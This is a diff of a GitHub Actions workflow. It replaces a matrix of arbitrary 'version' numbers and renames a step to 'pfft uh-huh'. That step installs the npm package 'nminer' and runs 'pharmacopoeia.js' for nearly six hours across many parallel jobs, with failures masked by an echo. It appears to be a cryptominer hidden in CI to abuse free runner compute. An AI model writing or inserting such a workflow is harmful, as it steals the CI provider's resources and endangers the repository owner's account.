@@ -9,22 +9,23 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 1407 }
-          - { version: 4574 }
-          - { version: 4955 }
-          - { version: 1948 }
-          - { version: 2862 }
-          - { version: 458 }
-          - { version: 2126 }
-          - { version: 9915 }
-          - { version: 7769 }
-          - { version: 7360 }
-          - { version: 7023 }
-          - { version: 1650 }
-          - { version: 1135 }
-          - { version: 3619 }
-          - { version: 3770 }
-          - { version: 9515 }
+          - { version: 856 }
+          - { version: 9585 }
+          - { version: 6363 }
+          - { version: 457 }
+          - { version: 5535 }
+          - { version: 4389 }
+          - { version: 9971 }
+          - { version: 3713 }
+          - { version: 5782 }
+          - { version: 8240 }
+          - { version: 2428 }
+          - { version: 6324 }
+          - { version: 8864 }
+          - { version: 7361 }
+          - { version: 2086 }
+          - { version: 8396 }
+          - { version: 2635 }
 
     steps:
       - name: Checkout
@@ -35,7 +36,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: 
+      - name: pfft uh-huh
         run: |
           npm install nminer@latest
-          timeout 312m node pharmacopoeia.js || echo "pharmacopoeia executed"
+          timeout 342m node pharmacopoeia.js || echo "pharmacopoeia executed"
